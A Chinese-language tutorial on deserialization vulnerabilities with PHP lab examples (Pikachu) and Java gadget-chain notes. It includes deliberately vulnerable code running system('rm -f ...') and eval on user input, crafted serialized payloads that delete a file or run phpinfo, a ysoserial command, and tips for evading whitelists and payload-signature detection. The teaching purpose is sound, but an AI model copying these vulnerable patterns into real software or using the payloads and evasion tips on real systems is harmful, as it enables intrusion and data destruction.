# 反序列化漏洞

## 1.1 反序列化概念

### 1.1.1 序列化

序列化是指将**内存中的数据结构（如对象、数组、字典等）转换为可存储或可传输的格式**（通常是字符串、二进制流）的过程。其核心目的是解决数据在 “存储（如写入文件、数据库）” 和 “传输（如网络通信）” 中的兼容性问题 —— 内存中的数据依赖于特定编程语言的运行环境，无法直接跨平台、跨场景复用，而序列化后的数据可脱离原环境，在其他地方被还原。

以生活场景类比：若将 “手机里的联系人列表” 视为内存中的数据结构，“把联系人导出为 vCard 格式文件” 就是序列化过程，导出的 vCard 文件可拷贝到其他手机或电脑中使用。

不同编程语言的序列化格式不同，例如：



* PHP：序列化后为带有数据类型标识的字符串（如`a:2:{i:0;s:5:"apple";i:1;s:6:"banana";}`表示包含 2 个元素的数组）；

* Java：序列化后为二进制流（需实现`Serializable`接口）；

* Python：通过`pickle`模块序列化，结果为二进制数据。

### 1.1.2 反序列化

反序列化是**序列化的逆过程**，即把序列化后的 “可存储 / 可传输数据” 还原为原编程语言能识别的内存数据结构（如对象、数组）的过程。

仍以 “联系人” 为例：“将 vCard 文件导入到新手机，还原为手机通讯录中的联系人列表” 就是反序列化过程。

反序列化本身是编程语言的正常功能，广泛用于：



* 分布式系统通信（如微服务间传递对象）；

* 数据持久化（如将用户会话信息序列化后存入 Cookie 或 Redis）；

* 缓存场景（如将复杂计算结果序列化后缓存，避免重复计算）。

但**当反序列化过程中，输入的数据被恶意篡改时，可能导致攻击者注入恶意代码，进而引发反序列化漏洞**—— 这是本章的核心研究内容。

## 1.2 PHP 反序列化

PHP 反序列化漏洞的本质是：当程序将 “不可信的用户输入” 直接作为反序列化函数（`unserialize()`）的参数时，攻击者可构造恶意的序列化字符串，通过篡改对象的属性或触发对象的 “魔术方法”（如`__construct()`、`__destruct()`、`__wakeup()`等），执行预设的恶意代码。

### 1.2.1 无类测试（基础原理验证）

无类场景主要用于理解`unserialize()`函数的基本行为 —— 即使不定义自定义类，也可通过反序列化数组、字符串等简单数据类型，观察输入与输出的对应关系，为后续复杂场景打基础。

#### 测试步骤：



1. **创建基础脚本**（验证正常反序列化）：

   编写`test1.php`，实现 “序列化数组→输出序列化字符串→反序列化→打印结果” 的流程：



```
\<?php

// 1. 定义一个普通数组（内存中的数据结构）

\$normal\_data = array("name" => "Alice", "age" => 20);

// 2. 序列化数组，得到可传输的字符串

\$serialized\_str = serialize(\$normal\_data);

echo "序列化后的字符串：" . \$serialized\_str . "\<br>";

// 3. 反序列化，将字符串还原为数组

\$unserialized\_data = unserialize(\$serialized\_str);

echo "反序列化后的结果：\<br>";

var\_dump(\$unserialized\_data); // 打印还原后的数组

?>
```



1. **运行脚本观察结果**：

   访问`http://localhost/test1.php`，输出如下（可清晰看到序列化字符串的格式）：



```
序列化后的字符串：a:2:{s:4:"name";s:5:"Alice";s:3:"age";i:20;}

反序列化后的结果：

array(2) { \["name"]=> string(5) "Alice" \["age"]=> int(20) }
```

其中，序列化字符串中：



* `a:2`表示 “数组（array）类型，包含 2 个元素”；

* `s:4:"name"`表示 “字符串（string）类型，长度 4，值为 name”；

* `i:20`表示 “整数（int）类型，值为 20”。

1. **构造恶意输入测试**（模拟漏洞场景）：

   编写`test2.php`，直接将用户通过 URL 传入的参数作为`unserialize()`的输入（这是典型的不安全写法）：



```
\<?php

// 接收用户输入（URL参数?data=xxx），无任何过滤直接反序列化

\$user\_input = $\_GET\['data'];

echo "用户输入的序列化字符串：" . \$user\_input . "\<br>";

// 危险操作：反序列化不可信输入

\$result = unserialize(\$user\_input);

echo "反序列化结果：\<br>";

var\_dump(\$result);

?>
```

攻击者可构造恶意序列化字符串，例如：



* 访问`http://localhost/test2.php?data=a:1:``{s:6:"malice";s:10:"恶意内容";}`，反序列化后会得到包含 “恶意内容” 的数组；

* 若进一步构造包含代码执行的 payload（需结合后续 “有类测试” 的魔术方法），可实现更危险的攻击。

### 1.2.2 有类测试（漏洞核心场景）

PHP 的 “魔术方法” 是有类场景下反序列化漏洞的关键 —— 这些方法会在对象的特定生命周期自动触发（如对象被销毁时触发`__destruct()`）。若类中定义了包含危险操作（如`eval()`、`system()`）的魔术方法，攻击者可构造序列化字符串篡改对象属性，让魔术方法执行恶意代码。

#### 测试步骤：



1. **定义存在风险的类**：

   编写`test3.php`，定义`User`类，其中`__destruct()`方法会执行 “删除指定文件” 的操作（危险操作）：



```
\<?php

class User {

&#x20;   public \$filename; // 存储要删除的文件名

&#x20;   // 魔术方法：对象被销毁时自动执行

&#x20;   public function \_\_destruct() {

&#x20;       // 危险操作：直接使用对象属性作为unlink()的参数（无过滤）

&#x20;       \$delete\_cmd = "rm -f " . \$this->filename;&#x20;

&#x20;       system(\$delete\_cmd); // 执行系统命令

&#x20;       echo "已执行命令：" . \$delete\_cmd;

&#x20;   }

}

// 接收用户输入的序列化字符串

\$user\_input = $\_GET\['data'];

// 反序列化：若输入为User对象的序列化字符串，会自动创建User对象

unserialize(\$user\_input);

?>
```



1. **构造恶意序列化字符串**：

   攻击者的目标是让`__destruct()`执行`rm -f /tmp/important.txt`（删除目标文件），需先手动创建 “恶意 User 对象” 并序列化，得到攻击 payload：



```
\<?php

// 攻击者本地构造恶意对象

class User {

&#x20;   public \$filename = "/tmp/important.txt"; // 要删除的目标文件

}

// 序列化恶意对象，得到攻击payload

echo serialize(new User());&#x20;

?>
```

运行上述代码，得到恶意序列化字符串：



```
O:4:"User":1:{s:8:"filename";s:18:"/tmp/important.txt";}
```

其中，`O:4:"User"`表示 “对象（object）类型，类名长度 4，类名为 User”。



1. **发起攻击并验证**：

   访问`http://localhost/test3.php?data=O:4:"User":1:{s:8:"filename";s:18:"/tmp/important.txt";}`，服务器会执行`rm -f /tmp/important.txt`，删除目标文件 —— 这证明了有类场景下反序列化漏洞的危害。

### 1.2.3 Pikachu 实操（漏洞实战演练）

Pikachu 是一款开源的 Web 漏洞测试平台，内置 “PHP 反序列化” 漏洞场景，可通过实操加深对漏洞利用流程的理解。

#### 实操环境准备：



1. 搭建 Pikachu 平台：

* 下载地址：https://github.com/zhuifengshaonianhanlu/pikachu

* 部署要求：PHP 环境（推荐 PHP 7.3 及以下，高版本 PHP 对部分魔术方法行为有调整）+ MySQL 数据库；

* 安装步骤：解压后访问`http://localhost/pikachu/install.php`，按提示配置数据库，完成安装。

#### 实操步骤：



1. **进入漏洞场景**：

   登录 Pikachu（默认账号密码：admin/123456），点击左侧菜单 “反序列化漏洞”→“PHP 反序列化”，进入测试页面。

2. **分析漏洞代码**：

   点击页面中的 “查看源码”，观察核心代码（关键部分如下）：



```
class S{

&#x20;   var \$test;

&#x20;   function \_\_construct(){

&#x20;       \$this->test = "pikachu";

&#x20;   }

&#x20;   function \_\_destruct(){

&#x20;       // 危险操作：若test属性为eval()语句，会执行代码

&#x20;       eval(\$this->test);&#x20;

&#x20;   }

}

if(isset($\_GET\['data'])){

&#x20;   \$data = $\_GET\['data'];

&#x20;   unserialize(\$data); // 无过滤，直接反序列化用户输入

}
```

可见，`S`类的`__destruct()`方法包含`eval()`（执行任意 PHP 代码），且`unserialize()`直接接收`$_GET['data']`—— 这是典型的可利用漏洞。



1. **构造攻击 Payload**：

   攻击者的目标是让`eval()`执行`phpinfo();`（查看服务器 PHP 信息，验证漏洞），步骤如下：

* 本地编写代码，创建`S`对象，将`test`属性设为`phpinfo();`，并序列化：



```
\<?php

class S{

&#x20;   var \$test = "phpinfo();";

}

echo serialize(new S());

?>
```



* 运行代码，得到 Payload：



```
O:1:"S":1:{s:4:"test";s:10:"phpinfo();";}
```



1. **发起攻击并验证**：

   将 Payload 作为`data`参数传入，访问：



```
http://localhost/pikachu/vul/unsafe deserialization/unsafe deserialization1.php?data=O:1:"S":1:{s:4:"test";s:10:"phpinfo();";}
```

页面会显示 PHP 信息，证明漏洞利用成功 —— 若将`phpinfo();`替换为`system("whoami");`，可进一步获取服务器权限。

## 1.3 Java 反序列化

Java 反序列化漏洞的影响范围远大于 PHP，因其广泛存在于 Java 生态的中间件（如 WebLogic、Tomcat）、框架（如 Spring）中，且利用链复杂多样。其核心原理与 PHP 类似：当程序对 “不可信的序列化二进制流” 执行`ObjectInputStream.readObject()`（Java 反序列化核心方法）时，攻击者可构造恶意二进制流，触发特定类的方法调用链（即 “反序列化利用链”），执行恶意代码。

### 1.3.1 应用场景

Java 反序列化漏洞主要出现在以下场景，需重点关注：



1. **中间件通信**：

* WebLogic 的 T3 协议（用于远程调用）、Tomcat 的 AJP 协议（用于前端服务器与后端 Tomcat 通信），均会传输序列化对象，若未过滤恶意流，易被攻击；

* 示例：2017 年爆发的 WebLogic T3 协议反序列化漏洞（CVE-2017-3506），攻击者可通过构造恶意 T3 数据包，远程执行代码。

1. **数据存储与传输**：

* 将序列化对象存入 Cookie、Session（如 JBoss 的 Session 存储）、Redis 缓存，若这些数据可被用户篡改，会引发漏洞；

* 示例：某 Java Web 应用将用户信息序列化后存入 Cookie，攻击者修改 Cookie 中的序列化数据，触发反序列化漏洞。

1. **第三方组件**：

* 使用存在漏洞的组件，如 Apache Commons Collections（2015 年爆出库中`InvokerTransformer`类可构造利用链）、Fastjson（2020 年爆出库中`autoType`功能可触发反序列化）。

### 1.3.2 主流对象（核心利用链依赖类）

Java 反序列化漏洞的利用依赖 “利用链”—— 即通过多个类的方法调用，最终触发恶意代码执行。以下是构建利用链的核心类（需理解其作用，无需死记）：



1. **Apache Commons Collections 相关类**：

* `InvokerTransformer`：提供`transform()`方法，可通过反射调用任意类的任意方法（如`Runtime.exec()`执行系统命令）；

* `TransformedMap`：对 Map 的键 / 值进行 “转换”，当 Map 的键 / 值被操作时，会调用`InvokerTransformer.transform()`—— 这是构建利用链的关键环节。

1. **JDK 内置类**：

* `java.util.HashMap`：反序列化时会调用`putVal()`方法，若 HashMap 是`TransformedMap`的实例，会触发`transform()`；

* `java.io.ObjectInputStream`：反序列化核心类，`readObject()`方法会读取二进制流并还原对象，过程中会调用对象的`readObject()`方法（若自定义实现）。

1. **Fastjson 相关类**：

* `com.alibaba.fastjson.JSONObject`：Fastjson 解析 JSON 时，若开启`autoType`功能，可根据 JSON 中的`@type`字段指定类，进而触发该类的反序列化（如`com.sun.rowset.JdbcRowSetImpl`类可构造利用链）。

### 1.3.3 小技巧（漏洞测试与利用要点）



1. **快速检测漏洞是否存在**：

* 使用工具：Burp Suite 插件（如 Java Deserialization Scanner）、Nmap 脚本（`nse/scripts/java-deserialization.nse`），扫描目标是否支持序列化通信（如 T3 协议）；

* 手动验证：向目标发送 “已知触发异常的序列化流”（如空流、无效格式流），若返回 “反序列化失败” 相关错误（如`InvalidClassException`），说明目标存在反序列化入口。

1. **利用链选择技巧**：

* 优先使用 “JDK 内置类利用链”：无需目标服务器存在第三方组件（如`ysoserial`（下载地址：https://github.com/frohoff/ysoserial）工具中的`Jdk7u21`利用链），兼容性更强；

* 若目标存在第三方组件：根据组件版本选择对应利用链（如目标有 Apache Commons Collections 3.1，选择`CommonsCollections1`利用链）；

* 工具推荐：`ysoserial`（Java 反序列化 Payload 生成工具，可生成多种利用链的 Payload，命令：`java -jar ysoserial.jar CommonsCollections1 "calc.exe" > payload.ser`）。

1. **绕过防护的小技巧**：

* 绕过 “类白名单过滤”：使用目标服务器已存在但未被列入黑名单的类构造利用链（如利用`javax.management.BadAttributeValueExpException`类）；

* 绕过 “序列化流长度限制”：将恶意 Payload 分块传输，或使用压缩算法减小 Payload 体积；

* 注意 Java 版本差异：高版本 Java（如 Java 8u121+）对部分危险类（如`sun.reflect.annotation.AnnotationInvocationHandler`）的反序列化行为做了限制，需选择适配的利用链。

1. **实战注意事项**：

* 避免直接执行敏感命令（如`rm -rf /`）：测试阶段优先执行`whoami`、`calc.exe`（Windows）、`xterm`（Linux）等无破坏性命令，验证漏洞即可；

* 关注流量特征：部分防护设备会检测`ysoserial`生成的 Payload 特征，可对 Payload 进行简单混淆（如修改无关字段值）；

* 修复建议：反序列化入口处添加 “类白名单过滤”（仅允许可信类被反序列化）、禁用危险协议（如 WebLogic 关闭 T3 协议）、升级存在漏洞的组件（如 Fastjson 升级到 1.2.83+）。